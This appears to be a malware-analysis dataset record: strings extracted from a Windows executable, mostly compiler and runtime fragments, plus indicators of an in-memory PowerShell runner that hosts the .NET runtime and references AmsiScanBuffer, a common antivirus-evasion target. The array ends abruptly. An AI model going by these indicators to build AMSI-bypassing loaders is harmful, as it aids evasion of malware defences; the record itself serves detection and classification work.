{
    "malware_data": [
        {
            "filename": "151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030.exe",
            "filetype": "4D5A9000",
            "filesize": "650KB",
            "hash_sha256": "151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030",
            "strings": [
                "!This program cannot be run in DOS mode.",
                "RRich",
                ".textbssW?",
                ".text",
                "`.rdata",
                "@.data",
                ".pdata",
                "@.idata",
                "@.msvcjmc",
                ".00cfg",
                "@_RDATA",
                "@.rsrc",
                "@.reloc",
                "l$ H",
                "Hc@<H",
                "@r9H",
                "a|%H",
                "LSuqH",
                "@UWH",
                "UVWH",
                "l$@H",
                "T$0H",
                "T$(H",
                "T$ E3",
                "l$0H",
                "L$ L",
                "L$ UWH",
                "M(E3",
                "D$@H",
                "D$ H",
                "L$(H",
                "\\$0H",
                "l$8H",
                "t$@H",
                "WAVAWH",
                "9*~83",
                "F9|1",
                "F9<0t",
                "L$8H",
                "D9;u",
                "L$8D",
                "\\$@H",
                "l$HH",
                "t$PH",
                " A_A^_",
                "|$ AVH",
                "D$@@",
                "t$8H",
                "|$HH",
                "VWAVH",
                "\\$xH",
                "@A^_^",
                "D$8L",
                "\\$ UVWATAUAVAWH",
                "\\/ L",
                "T$pH",
                "T$hH",
                "T$`L",
                "T$XL",
                "T$PH",
                "T$HH",
                "D$8H",
                "D$0H",
                "A_A^A]A\\_^]",
                "w\"Hc",
                "WATAUAVAWH",
                "t$XH",
                "\\$PI",
                " A_A^A]A\\_",
                "@USVWATAUAVAWH",
                "D$(D",
                "L$HH",
                "D$TH",
                "\\$XH",
                "D$(H",
                "L$DH",
                "t$0H",
                "t$(L",
                "t$(A",
                "d$0L",
                "t$(H",
                "D$ L",
                "D$DA",
                "A_A^A]A\\_^[]",
                "T$(L",
                "\\$ H",
                "L$ SUVWH",
                "l$xH",
                "l$(L",
                "8_^][",
                "T$@H",
                "D$H9D$ s\"",
                "D$PI",
                "\\$ WH",
                "L$XH",
                "T$PL",
                "L$0L",
                "L$`H",
                "L$(3",
                "\\$hH",
                "@SVWH",
                "T$`H",
                "L$hH",
                "L$pH",
                "@_^[",
                "M H1E",
                " H3E H3E",
                "\\$ UH",
                "\\$HH",
                "LcA<A",
                "HcA<H",
                "t!eH",
                "L$PH",
                "uxHc",
                "uTL+",
                "L$ 3",
                "D$PH",
                "D$H3",
                "L$ D",
                "ED$`H",
                "u/HcH<H",
                ";csm",
                "\\$03",
                "UAVAWH",
                "D$HA",
                "A_A^]",
                "D$(L",
                "fD9|TP",
                "C\\f9DLPt",
                "DTPA",
                "DL|H",
                "USVWATAUAVAWH",
                "$D;t",
                "uPH9=",
                "u1@8=",
                "L$8E3",
                "|$0H",
                "|$(3",
                "L$ H",
                "|$0D",
                "|$ H",
                "|$0L",
                "T$ 3",
                "t$0E3",
                "td+uoA;6r\\A",
                "D9m_v",
                ";M_r",
                "|$(H",
                "ntelA",
                "ineID",
                "Genu",
                "t(=`",
                "t!=p",
                " w$H",
                "T$ H",
                "D$ \"",
                "D$ $",
                "\\$(3",
                "L$ fD",
                "D$HH",
                "D$hH",
                "D$ D",
                "L$tH",
                "D$XH",
                "L$PA",
                "L$ WH",
                "D$tH",
                "D$dH",
                "D$ 3",
                "L$@H",
                "D$XL",
                "D$`H",
                "T$(3",
                "D$pH",
                "L$@f",
                "L$ f",
                "L$@L",
                "HcD$DH",
                "}\\HcE",
                "H;EXw",
                "E` H",
                "MpH3",
                "D$ %",
                "T$h3",
                "l$PH",
                "H9E(v",
                "H9Eh",
                "ExHk",
                "D$ E3",
                "D$ =",
                "D$ -",
                "D$hL",
                "ffff",
                "ffffff",
                "fffffff",
                "ob0f",
                "obpf",
                "fffff",
                "L$xL",
                "\\$(H",
                "l$XH",
                "t$`H",
                "L$x3",
                "x AV",
                "D8L$0uP",
                "t$ H",
                "|$(A^",
                "L$HI",
                "L$0t",
                "L$0A",
                "VWATAVAWH",
                "twIcF",
                "T$PE3",
                "D$PD",
                "l$`H",
                " A_A^A\\_^",
                "D;9|",
                "d$ A",
                "d$0A",
                "\\$@I",
                "D$(A",
                "A_A^A]A\\_",
                "x AVH",
                "T$03",
                "(t$ H",
                "(t$ A",
                "G$A;",
                "D$0L",
                "\\$`H",
                "(t$P",
                "HcE_H",
                "D$(I",
                "HcE_L",
                "HcEgH",
                "H;XXs",
                "H;xXu5",
                "p WH",
                "t$hH",
                "T$@L",
                "\\$`I",
                "_8M+",
                "t$8;;",
                "L$0I",
                "x}~t",
                "w I+",
                " tDE3",
                "|$@H",
                "t$ WH",
                "|$(L",
                "\\$8H",
                "D$@D",
                "\\$pH",
                "t$xH",
                ")D$0L",
                "9csm",
                "A - ",
                "t7HcP",
                "C - ",
                "?RCC",
                "?MOC",
                "?csm",
                ":csm",
                "B - ",
                "R8HcH",
                "t=L;",
                "(McH",
                "L$@I",
                "L$@;|",
                "tRLcY",
                "AUAVAWH",
                "u4I9}(",
                ";I9}(tiH",
                "\\$PH",
                "|$`H",
                "0A_A^A]",
                "UVWATAUAVAWH",
                "L$PI",
                "l$(H",
                "`A_A^A]A\\_^]",
                "T$xL",
                "|$hH",
                "|$ E",
                "K0HcQ",
                "L$pL",
                "C0Hc",
                "d$xH",
                "D$hI",
                "d$xL",
                "HcO H",
                "HcG H",
                "t$HL",
                "l$8M",
                "D$0I",
                "T$xI",
                "t)IcV",
                "|$xL",
                "t$ D",
                "D$hA",
                "E E3",
                "D$pHc",
                "d$dH",
                "d$dD;d$ltY",
                "T$xM",
                "d$0H",
                "L$hA",
                "L$h;M",
                "@tQI",
                "d$8M",
                ">MOC",
                ">RCC",
                "mwtMH",
                "d$8I",
                "D$0D",
                "t-Lck",
                "@uDH",
                "MGD;}",
                "D$pL",
                "D$xI",
                "|$8H",
                "d$(L",
                "d$(H",
                "t$ E",
                "D$`A",
                "@uIH",
                "d$@H",
                "L$`;M",
                "M(H3",
                "tK9_",
                " t]9",
                "HcK H",
                "L$0H",
                "D$8M",
                "l$hH",
                "t$pH",
                "|$xH",
                "9p@u+",
                "t#D9",
                "t'HcW",
                "9t$Pu",
                "C09p",
                "L$8I",
                "A_A^_",
                "IH9B",
                "tEHcR",
                "t1HcR",
                "@SVWATAUAVAWH",
                "|$ D!",
                "L!|$(L!",
                "D$HL",
                "D$8L9",
                "\\$(L",
                "t$PL",
                ">csm",
                "F - ",
                "D$0HcH",
                "pA_A^A]A\\_^[",
                "SVWATAUAWH",
                "d$ D!",
                "L!d$(L!d$@D",
                "D$PL",
                "D$HL9gXt",
                "L$@A",
                "\\$(I",
                "|$8L",
                "D$@L",
                "d$ H",
                "l$HI",
                "A_A]A\\_^[",
                " u\\A",
                "A A+",
                "B(I9A(",
                "I A+",
                "SVWATAUAVAWH",
                "|$pL",
                "0A_A^A]A\\_^[",
                "L$`D",
                "t$xA",
                "t?HcS",
                "T$8H",
                "T$XH",
                "L$0E",
                "|$8L;",
                "L;|$X",
                "(D$0f",
                "L$@E",
                "|$DL",
                "d$pL",
                "A_A^A]A\\_^[",
                "L$HL",
                "t/HcR",
                "t$ WATAUAVAWH",
                "E0Lc`",
                "E0HcH",
                "~THc",
                "\\$PA",
                "9)~P3",
                "\\$0H+",
                "9Q t",
                "HcC H",
                "99~CE",
                "d$xI",
                " A_A^A]A\\_^]",
                "D$ f",
                "t$HH",
                "t#eH",
                "t(eH",
                "t0eH",
                "toE3",
                "D$8E3",
                "L$5L",
                "\\$5L3",
                "D$5I",
                "L$8H3",
                "L$4L",
                "T$4I",
                "D$4I",
                "t^H91u",
                "D$PM",
                "L$0tA",
                "\\$H3",
                "T$PI",
                "(D$Pf",
                "(D$PH",
                "T$xH",
                "D$P3",
                "D$xA",
                "<`t)H",
                "T$0L",
                "L$0t}",
                "L$@t",
                "]h9]xtX3",
                "(D$0H",
                "L$`f",
                "L$pf",
                "\\$HD",
                "D$8 ",
                "D$80",
                "D$8/",
                "\\$HE",
                "\\$HA",
                "H9=~",
                "8@tm",
                "8@u?H",
                "D88tS3",
                "L9?tb",
                "L9:tgH",
                "<0t0<2t",
                "<5u`",
                "x UH",
                "Kwvt,",
                "_t5I",
                "Ct.A",
                "_ufA",
                "|$hL",
                "t$pL",
                "D$X$$h",
                "wFt=",
                "|$XH",
                "UATAUAVAWH",
                "T$!8",
                "D$!H",
                "D$X3",
                "T$h@",
                "T$ D",
                "@+A:",
                "d$hA",
                "|$PH",
                "8$u-E",
                "D$03",
                "|$HM",
                "|$HE3",
                "L9d$Xt2A",
                "|$H@",
                "D9d$8",
                "L$xf",
                "D8 t(H",
                "d$8L",
                "D8 t'H",
                "|$HD8d$PtB",
                "|$HD8d$ tB",
                "uSM9&tN",
                "d$XH",
                "L$XD",
                "M9&t;",
                "D8d$!t",
                "u{I9",
                "uGI9",
                "D$0M",
                "A_A^A]A\\]",
                "8?t{",
                "uP8P",
                "p UH",
                "8_u4",
                "_u.H",
                "@81u",
                "@8t$(t\\H",
                "\\$ fI",
                "D8)u#L",
                ")u\"D8)t",
                "D8(tLH",
                "M9/tA",
                "`<`t",
                "L$03",
                "8_u<",
                "Eu6H",
                "(D$ f",
                "` UAVAWH",
                "<>u98]",
                "D8&u",
                "8?u)",
                "@t\"H",
                "8@uqH",
                "8XugH",
                "8$uF",
                "TuVH",
                "_t1L",
                "tfI9",
                "OH9]",
                "PL9u",
                "UAUAVH",
                "L97t{L",
                "L$PD",
                "t$(E3",
                "t$ D8t$(uZH",
                "L$pD",
                "8_uX",
                "?uRE3",
                "D80t",
                "8@tvD",
                "iL97u",
                "L$0f",
                "A^A]]",
                "8@tTL",
                "<?u@H",
                "8?u$H",
                "$u\"8K",
                "8$uFH",
                ":$t>H",
                "L$0D",
                "D8t$(",
                "H!|$ H",
                "L$ !|$(",
                "<>u:D8t$(",
                "|$ D8t$(",
                "|$ UAVAWH",
                ":@u6H",
                "GL9u",
                "\\$pI",
                "Xu6H",
                "urD!",
                "80|(A",
                "0|MD",
                "L$ A",
                "L$ E3",
                "8@t?E3",
                "t4E3",
                "8@u4H",
                "UWAVH",
                "9?u]3",
                "M7H3",
                "A^_]",
                "@uaH",
                "$ue3",
                "D$xH",
                "Wu-D",
                "WuKD",
                "x ATAVAWH",
                " A_A^A\\",
                "Wu+D",
                "T$8D",
                "T$8L",
                "L$HE",
                "T$8A",
                "N0E3",
                "A8fD",
                "A@fD",
                "p AWH",
                "8\"uu",
                "8\"u3",
                "|$PL",
                "ATAVAWH",
                "L9d$p",
                "8\"uz",
                "8\"u4",
                "y)fD",
                "0A_A^A\\",
                "@USVWATAVAWH",
                "d$9fD",
                "d$=D",
                "d$?H",
                "d$8H",
                "d$pH",
                "\\$xD",
                "D$0H;",
                "x(H;",
                "D8d$Xt",
                "A_A^A\\_^[]",
                "x*H;",
                "tgfD",
                "@USVWATAUAWH",
                "l$9fD",
                "l$=D",
                "l$?H",
                "l$0A",
                "l$pL",
                "d$`H",
                "D8l$Xt",
                "A_A]A\\_^[]",
                "@uSD",
                "D$ A",
                "@uUD",
                "I LcA",
                "A HcH",
                "D+AHH",
                "E+BHH",
                "Q8fD",
                "Q@fD",
                "L$ @",
                "t$hL",
                "t$pD",
                "t$xfD",
                "L$XL",
                "T$`D",
                "D8t$8t",
                "t$xD",
                "t+E3",
                "\\$PE",
                "upA9",
                "D$@H;G",
                "\\$H@",
                " A^_^",
                "D$0H;G",
                " t(<#t",
                "<0uC",
                "CA, <Zw",
                "{A*H",
                "9.}H",
                "CA< t(<#t",
                "<0uG",
                "<0u>",
                "9s,t",
                "<0u?",
                "t3fA",
                "#t'fA",
                "x ATAUAVH",
                "{B*H",
                "9.}I",
                "CBfA;",
                "#t$f",
                " A^A]A\\",
                "AA< t(<#t",
                "yA*H",
                "yB*H",
                "AA<Fu",
                "<Nu'",
                "<htl<jt\\<lt4<tt$<wt",
                "8<6u",
                ",X< w",
                "htxf",
                "jtff",
                "lt:f",
                "tt(f",
                "t$ WAVAWH",
                "<Ct-<D",
                "<StW@:",
                "tg<Zt",
                "<g~{<itd<ntY<ot7<pt",
                "<utT@:",
                "D$P-",
                "D$P+",
                "D$P I",
                "D<P0@:",
                "t<QH",
                "k4+kP+",
                "0A_A^_",
                "k(+sPL",
                "VWAUAVAWH",
                "Ct9f",
                "Stof;",
                "Zt f",
                "itnf",
                "ntaf",
                "ot=f",
                "utTf;",
                "l$0I",
                "L|0f;",
                "t|2H",
                "s4+sP+",
                "T$0I",
                "A_A^A]_^",
                "d|0f;",
                "s(+kPH",
                "yA*L",
                "yB*L",
                "w.Hc",
                "AA,c",
                "CA,c",
                "AA,A$",
                "yAgt",
                "yAGu",
                "CA,G",
                "K0@H",
                ",I<%w",
                "CAsH",
                "CA,A$",
                "{Agt",
                "{AGu",
                "sXHc",
                "AfA#",
                "yBgt",
                "yBGu",
                "|$ AWH",
                "{Bgt",
                "{BGu",
                "T$@f",
                "T$0@",
                "D$1H",
                "D$0@",
                "t$1H",
                "HcS8",
                "KHf9",
                "HcC(H",
                "D$8HcK(H",
                "Q0E3",
                "KHIc",
                "_HHc",
                "_HE3",
                "IHHc",
                "IHE3",
                "T$@3",
                "|$@D",
                "9$uu",
                "9$uw",
                "D$`u",
                "<%ti",
                "8$u-",
                "D$0f",
                "u^Hc",
                "uwHc",
                "uyHc",
                "T$4D",
                "D$0E",
                "T$4H",
                ";{Pu",
                "L$@H3",
                "D8qT",
                "D9qP",
                "L$PfD",
                "0A^_^",
                "@8iT",
                "?H+A",
                "DH+A",
                "|$`I",
                "8*u;I",
                "8*uEI",
                "WATAWH",
                "8\"u@",
                "0A_A\\_",
                "x ATAUAWH",
                "L9l$p",
                "8\"uA",
                "0A_A]A\\",
                "u3HcH<H",
                "u0HcH<H",
                "UVWAVAWH",
                "@8>u",
                "H9:t",
                "H98u",
                "0A_A^_^]",
                "f9>u",
                "|$`M",
                "< t=<",
                "` AWL",
                "fD9!u",
                "fD9a",
                " t$f",
                "|$ L",
                "d$(A_",
                "u&H9",
                "H9=%L",
                "A84.u",
                "<=t5",
                "t$ E3",
                "fA94@u",
                "fA94nu",
                "t$(3",
                "D$8A",
                "L$(A",
                "D$hM",
                "L$`M",
                "D$ M",
                "H33M3",
                "H9+t",
                "uDI+",
                "uAI+",
                "x AUAVAWH",
                "t2A;",
                "s-A;",
                "@88t",
                "t@A;",
                "@A_A^A]",
                "L9\"u",
                "|$xA",
                "Hvf;",
                "HFf;",
                "t:f9",
                "Avf;",
                "AFf;",
                "Q&f+",
                "t7A;",
                "s2A;",
                "?D8d$8t",
                "D8d$8t",
                "t'D8d$8t",
                "%D8d$8t",
                "A_A^A\\_^",
                "@A_A^_",
                "D$(f",
                "D$,p",
                "D$4p",
                "D$@f",
                "D$Dp",
                "D$HP",
                "D$LZ",
                "D$X ",
                "D$\\*",
                "D$`@",
                "D$dJ",
                "L$ f;",
                "f;\\$$s",
                "L$(f;",
                "f;\\$,r",
                "L$0f;",
                "f;\\$4r",
                "L$8f;",
                "f;\\$<r",
                "L$@f;",
                "f;\\$Dr",
                "L$Hf;",
                "r{f;\\$Lr",
                "L$Pf;",
                "rkf;\\$Tr",
                "L$Xf;",
                "r[f;\\$\\",
                "L$`f;",
                "rGf;\\$d",
                "L$hf;",
                "r3f;\\$l",
                "f;\\$t",
                "t6f9",
                "D$ f;",
                "f;\\$$r",
                "D$(f;",
                "D$0f;",
                "f;\\$4",
                "D$8f;",
                "f;\\$<",
                "D$@f;",
                "f;\\$D",
                "D$Hf;",
                "f;\\$L",
                "D$Pf;",
                "ruf;\\$T",
                "D$Xf;",
                "raf;\\$\\",
                "D$`f;",
                "rMf;\\$d",
                "D$hf;",
                "r9f;\\$l",
                "f;\\$ts",
                "t6A;",
                "t1D8",
                "L$ I",
                "Pvf;",
                "PFf;",
                "L$pA",
                "T$@I",
                "L$0M",
                "T$ L",
                "L$`I",
                "t7SH",
                "WuAD",
                "WuDD",
                "L$`L",
                "D$4H",
                "D$xL",
                "D$0H!L$ H",
                "\\$$;",
                "tmHc",
                "L$ VWAVH",
                "\\$8I;",
                "L$(L",
                "`A^_^",
                "P_^]",
                "EE(H",
                "fD9t$b",
                "@8*u",
                "@8l$Ht",
                "~/A;",
                "r>@8o",
                "L$ UVWH",
                "`_^]",
                "L$PLc",
                "u9fA",
                "t$@I",
                "d|.H",
                "gfffffffH",
                "D8t$ht",
                "|$@-H",
                "D$(3",
                "x AWH",
                "80tWD",
                "gfffA",
                "D$pI",
                "t$xM",
                "D$4E3",
                "|$0-D",
                "D$(I+",
                "\\$P3",
                "t$DE3",
                "|$@-D",
                "}=D;",
                "L$@D",
                "|$pH",
                "T$`E",
                "L9?|",
                "L9?}",
                "D$HI",
                "L$ M",
                "D$TE3",
                "|$P-H",
                "D$ I+",
                "t$HI",
                "8]8}KD",
                "T$$H",
                "u)9\\$ ~FH",
                ";\\$ |",
                "L$0H3",
                "l$pH",
                "t4SH",
                "H93t",
                "L$ SH",
                "Us0H",
                "D$8I",
                "D$@I",
                "f9(t",
                "l$ E3",
                "fD9;u",
                ";.u1L",
                "fE98t'",
                "@stf",
                "_tnH",
                ",uLH",
                "|$ E3",
                "D$pM",
                "9Cu,fD9y",
                "l$HA",
                "D$XE",
                "L$8L",
                "fB9<{u",
                "l$0L",
                "fD9,pu",
                "t$`fD9+t$I",
                "D$@fD",
                "@USWH",
                "0_[]",
                "|$x3",
                ";\\$p|",
                "0A_A^A]A\\_",
                "T$(A",
                "d$ E3",
                "fD9,Au",
                "L$@M",
                "D$0A",
                "D$ U",
                "D$@H+",
                "D$@A",
                "D;(L",
                "L;(L",
                "|$`CI",
                "D;(u",
                "f9t$bu",
                "D;(J",
                "H9L$Ht?H",
                "t;(J",
                "fE9,Fu",
                "tNH;",
                "L$8eH",
                "H 9Y",
                "u9!\\$0",
                "9\\$0u",
                "\\$0eH",
                "u$D8r(t",
                "D81uUL9r",
                "uED8r(t",
                "vAD8s(t",
                "fD91uTL9r",
                "t$8A",
                "t$0L",
                "v@D8s(t",
                "t$8L",
                "u\"8Z(t",
                "uUH9Z",
                "uF8Z(t",
                "vC8_(t",
                "uTH9Z",
                "\\$8A",
                "\\$0L",
                "vB8_(t",
                "\\$8L",
                "EP*?H",
                "}PI+",
                "UXM;",
                "C8<(u",
                "EXM;",
                "L$0E3",
                "t$8D",
                ":u#I",
                "t$Pf",
                "D$PI+",
                "t$0E",
                "fA9<Cu",
                "t^I+",
                "fC9<`u",
                "L$HN",
                "D$XD",
                "@84)u",
                "H97u+A",
                "mL+7H",
                "f94iu",
                ",/<-w",
                "@8|$Ht",
                "M+4$I",
                "D$XD9x",
                "@8|$ht",
                "t <.u",
                "t)I+",
                "\\$ UVWAVAWH",
                "I+6H",
                "|$\\.u",
                "f9|$^t&f",
                "|$^.u",
                "f9|$`t",
                "L$\\M",
                "A_A^_^]",
                "H99u+",
                "H+1H",
                "8D$8t",
                "@8j(t",
                "f9)u4H9j",
                "u%@8j(t",
                "l$8A",
                "l$(3",
                "@8k(t",
                "l$8L",
                "l$03",
                "8Z(t",
                "u0H9Z",
                "8_(t",
                "8A(t",
                "\\$@3",
                "D$VH",
                "D$p ",
                "@_^]",
                "\\$0H;",
                "L$0H;",
                "L$&8\\$&t,8Y",
                "t>8Z",
                "@A_A^A]A\\_^]",
                "*u.3",
                "*u/3",
                "D$HE",
                "fD90t",
                "fD94Fu",
                "fD96u",
                "t$8H+",
                "t$ 3",
                "f90t",
                "f9tE",
                "L;5p",
                "l$pu",
                "t?H95",
                "H95}",
                "xWI96tRI",
                "9t$x",
                "C847u",
                "0A_A^A]A\\_^]",
                "L;5t",
                "L;5!",
                "fB94ht",
                "xXI96tSI",
                "fC94wu",
                "uxfA",
                "H9/t",
                "H9(u",
                "f9,pu",
                "<p=t",
                "fD94pt",
                "t1H;",
                "\\$ VWATAUAVH",
                "D!l$xA",
                "@A^A]A\\_^",
                "D$(H;",
                "|$ I",
                "|$HL",
                "H!D$ H",
                "L$XE3",
                "L$DD",
                "D8\\0>t",
                "H}-H",
                "\\$0E",
                "L$LD",
                "9t$L",
                "L$Lf",
                "D$DE",
                "~-H+",
                "L$@D8]",
                "L$@8]",
                "VWAV",
                "\\$@H;",
                "D$@+",
                "A^_^",
                "VWATAVAW",
                "D$PI;",
                "D$PH+",
                "D$(U",
                "t$@;",
                "\\$ ;",
                "t$(I;",
                "s*Hc",
                "D8/u",
                "D8d$H",
                "E9&tJ",
                "A_A^A\\",
                "|$ UATAUAVAWH",
                "L$Pf",
                "9\\$P",
                "D$Hf",
                "L$P3",
                "HcD$PH",
                "HcD$HH",
                "L$XL;",
                "s WATAUAVAWH",
                "|$ A",
                "H9\\$X",
                "D$P;",
                "t*8Y",
                "\\$@A",
                "\\$0A",
                "D$(M",
                "D$h9t$P",
                "w%Hc",
                "A|fA",
                "t0SH",
                "?0t0",
                "t$0A",
                "swtA",
                "t$pA",
                "swyA",
                "t$0t",
                "T$0E",
                "u!E;",
                "st]A",
                "\\$(A",
                "T$0A",
                "L$,H",
                "+L$8A",
                "|$ps",
                "D$pD",
                "|$pss",
                "|$pA",
                "\\$tM",
                "T$pM",
                "L$tL;",
                "T$tA",
                "T$tE",
                "T$@E",
                "\\$,A",
                "T$@A",
                "|$pM",
                "+T$<",
                "|$pss%",
                "T$pA",
                "T$pD",
                "|$ H+",
                "D8t$ D",
                "SUVWATAVAWH",
                "D$DH",
                "l$@L",
                "\\$ E",
                "D$0E;",
                "A_A^A\\_^][",
                "@USVWH",
                "u)E3",
                "u(E3",
                "D$(E",
                "\\$ E3",
                "stTD",
                "stAD",
                "stjL",
                "_^[]",
                "D$4D",
                "u+E3",
                "D$$D",
                "t^E3",
                "ss\"E",
                "l$$A",
                "u-E3",
                "|$ 2",
                "stXD",
                "d$@E3",
                "D$DE3",
                "d$@L",
                "@UVATAVAWH",
                "sv0E",
                "A_A^A\\^]",
                "sv%E",
                "L$8M",
                "L$hL",
                "|$0H#",
                "t$`I",
                "swkA",
                "svBE3",
                "\\$DH",
                "T$8E",
                "\\$DA",
                "+L$LA",
                "taE3",
                "T$XE",
                "T$DL",
                "+T$P",
                "tjA;",
                "t$0H+",
                "D8|$0A",
                "u8E3",
                "B8 t",
                "D$83",
                "D$0H9D$8",
                "s&Hc",
                "K H;",
                "K(H;",
                "K0H;",
                "K8H;",
                "K@H;",
                "KHH;",
                "KhH;",
                "KpH;",
                "KxH;",
                "tfSH",
                "KXH;",
                "K`H;",
                "t$ A",
                "l$ A",
                "Q<;u",
                "|$ M",
                "f99t",
                "@UATAUAVAWH",
                "t$(M",
                "M H3",
                "e0A_A^A]A\\]",
                "fB9<Hu",
                "f9<Ju",
                "fB9<@u",
                "fB9<Bu",
                "VWAUH",
                "fB9,Nu",
                "uP9k",
                "f9,~u",
                "f9,Ju",
                "fA9,Au",
                "f9)u:H",
                "f9)u",
                "A]_^",
                "fB94Ou",
                "fD9 t",
                "fD9!H",
                "fD9&u",
                "fG9$Ou",
                "f;0t",
                "f9<Pu",
                "t;LcF",
                "fD94Au",
                "PD9v",
                "fD94iu",
                "u4D9v",
                "tSf91tNH",
                "tU;\\$0tH",
                "tyfD9 tsH",
                "tQfD9 tK",
                "fD9$Hu",
                "@A_A^A\\_^[]",
                "l$ WAVAWH",
                "\\$@M",
                "d$PH",
                "ATAUAVH",
                "L$ fff",
                "s I+",
                "L$ |+L;",
                "L$ I;",
                "L$ L;",
                "A^A]A\\",
                "D$@3",
                "Hc]`M",
                "d$(D",
                "tSH;",
                "|$(I",
                "H!T$0D",
                "ue!T$(H!T$ ",
                "|$(D",
                "|$0A",
                "D8}?t",
                "fE9>s",
                "T$(I",
                "fD9>s",
                "@A_A^A\\",
                "D$XH=",
                "T$pI",
                "@SUVWATAUAVAWH",
                "s%fD9",
                "8Htz",
                "8A_A^A]A\\_^][",
                "L$ SUVWATAUAVAWH",
                "8Ht0",
                "8Ht;H",
                " A_A^A]",
                "D;%6",
                "L$HM",
                "t=A;",
                "|$PA",
                "8}mH",
                "t$ I",
                "@8t$HtsL",
                "fA90u",
                "T$PA",
                "T$@E3",
                "fA94Ou",
                "<v(H",
                "D$0E3",
                "fE9S",
                "@A_A^_^]",
                "@UAVAWH",
                "e0A_A^]",
                "@SUVWATAVAWH",
                "|$ D",
                "u;E3",
                "D$09",
                "D$49C",
                "@CH;",
                "ot$ H",
                "t'H;",
                "|$ fA",
                "8\\$Pt",
                "D8|$`t",
                "L$`A",
                "D$ I",
                "fD93s",
                "fD96s",
                "E(Hc",
                "D8 u",
                "t D8`",
                "e8A_A^A]A\\_^[]",
                "T$`A",
                "\\$0D",
                "t A;",
                "D$0%",
                "?tKA",
                "\\$@=",
                "t$83",
                "USVWAVH",
                "D$@M",
                "A^_^[]",
                "D$(\"",
                "t$xL",
                "(t$PH",
                "(t$`H",
                "u1!D$0H",
                ")t$ ",
                "t`H=",
                "t?H=",
                "(t$ ",
                "\\$xA",
                "t>H=",
                "t&H=",
                "!P H",
                "!P`H",
                "A A#",
                "B`A#",
                "UWATAVAWH",
                "t$(D",
                "zucL",
                "D8&t ",
                "D8&t4H",
                "A_A^A\\_]",
                "L$(I",
                "t5H;",
                "0fA#",
                "LcA<E3",
                "t\"H+",
                "HcQ<H",
                "t%fE9",
                "@SUH",
                "8csm",
                "u\"HcMHH",
                "^PGo",
                "Pc@xB",
                "<W~C",
                "(Nir",
                "E5KV",
                "yp`H",
                "YKuI",
                "_ArgList",
                "bstrStaticMethodName",
                "vtStringArg",
                "vtPSInvokeReturnVal",
                "vtEmpty",
                "index",
                "patch",
                "pMetaHost",
                "pRuntimeInfo",
                "pCorRuntimeHost",
                "spAppDomainThunk",
                "spType",
                "spDefaultAppDomain",
                "bstrAssemblyName",
                "bounds",
                "spAssembly",
                "bstrClassName",
                "fLoadable",
                ")+c6",
                "PowerShellRunner",
                "PowerShellRunner.PowerShellRunner",
                "AmsiScanBuffer",
                "Stack pointer corruption",
                "Cast to smaller type causing loss of data",
                "Stack memory corruption",
                "Local variable used before initialization",
                "Stack around _alloca corrupted",
                "Unknown exception",
                "bad allocation",
                "bad array new length",
                "Stack around the variable '",
                "' was corrupted.",
                "The variable '",
                "' is being used without being initialized.",
                "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared with a different calling convention.",
                "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:  ",
                "char c = (i & 0xFF);",
                "Changing the code in this way will not affect the quality of the resulting optimized code.",
                "Stack memory was corrupted",
                "A local variable was used before it was initialized",
                "Stack memory around _alloca was corrupted",
                "Unknown Runtime Check Error",
                "Unknown Filename",
                "Unknown Module Name",
                "Run-Time Check Failure #%d - %s",
                "Stack corrupted near unknown variable",
                "%.2X ",
                "Stack area around _alloca memory reserved by this function is corrupted",
                "Data: <",
                "Allocation number within this function: ",
                "Size: ",
                "Address: 0x",
                "%s%s%p%s%zd%s%d%s%s%s%s%s",
                "A variable is being used without being initialized.",
                "RegOpenKeyExW",
                "RegQueryValueExW",
                "RegCloseKey",
                "PDBOpenValidate5",
                "perrinfo",
                "psei",
                "argList",
                "rgwParams",
                "pDest",
                "__$AllocaPad$",
                "dispparams",
                "dispidNamed",
                "rgvarg",
                "vaResult",
                "excepInfo",
                "nArgErr",
                "pcerrinfo",
                "bad exception",
                "__based(",
                "__cdecl",
                "__pascal",
                "__stdcall",
                "__thiscall",
                "__fastcall",
                "__vectorcall",
                "__clrcall",
                "__eabi",
                "__swift_1",
                "__swift_2",
                "__swift_3",
                "__ptr64",
                "__restrict",
                "__unaligned",
                "restrict(",
                " new",
                " delete",
                "operator",
                "`vftable'",
                "`vbtable'",
                "`vcall'",
                "`typeof'",
                "`local static guard'",
                "`string'",
                "`vbase destructor'",
                "`vector deleting destructor'",
                "`default constructor closure'",
                "`scalar deleting destructor'",
                "`vector constructor iterator'",
                "`vector destructor iterator'",
                "`vector vbase constructor iterator'",
                "`virtual displacement map'",
                "`eh vector constructor iterator'",
                "`eh vector destructor iterator'",
                "`eh vector vbase constructor iterator'",
                "`copy constructor closure'",
                "`udt returning'",
                "`RTTI",
                "`local vftable'",
                "`local vftable constructor closure'",
                " new[]",
                " delete[]",
                "`omni callsig'",
                "`placement delete closure'",
                "`placement delete[] closure'",
                "`managed vector constructor iterator'",
                "`managed vector destructor iterator'",
                "`eh vector copy constructor iterator'",
                "`eh vector vbase copy constructor iterator'",
                "`dynamic initializer for '",
                "`dynamic atexit destructor for '",
                "`vector copy constructor iterator'",
                "`vector vbase copy constructor iterator'",
                "`managed vector copy constructor iterator'",
                "`local static thread guard'",
                "operator \"\" ",
                "operator co_await",
                "operator<=>",
                " Type Descriptor'",
                " Base Class Descriptor at (",
                " Base Class Array'",
                " Class Hierarchy Descriptor'",
                " Complete Object Locator'",
                "`anonymous namespace'",
                "CV: ",
                "template-parameter-",
                "`template-parameter-",
                "generic-type-",
                "`generic-type-",
                "`non-type-template-parameter",
                "??_C",
                "NULL",
                "`template-type-parameter-",
                "`generic-class-parameter-",
                "`generic-method-parameter-",
                "nullptr",
                "lambda",
                "void",
                "`template-parameter",
                "`vtordispex{",
                "`vtordisp{",
                "`adjustor{",
                "`local static destructor helper'",
                "`template static data member constructor helper'",
                "`template static data member destructor helper'",
                "static ",
                "virtual ",
                "private: ",
                "protected: ",
                "public: ",
                "[thunk]:",
                "extern \"C\" ",
                "char ",
                "short ",
                "int ",
                "long ",
                "unsigned ",
                "void ",
                "volatile ",
                "volatile",
                "std::nullptr_t ",
                "std::nullptr_t",
                "<ellipsis>",
                ",...",
                ",<ellipsis>",
                " noexcept",
                "char",
                "short",
                "long",
                "float",
                "double",
                "bool",
                "__int8",
                "__int16",
                "__int32",
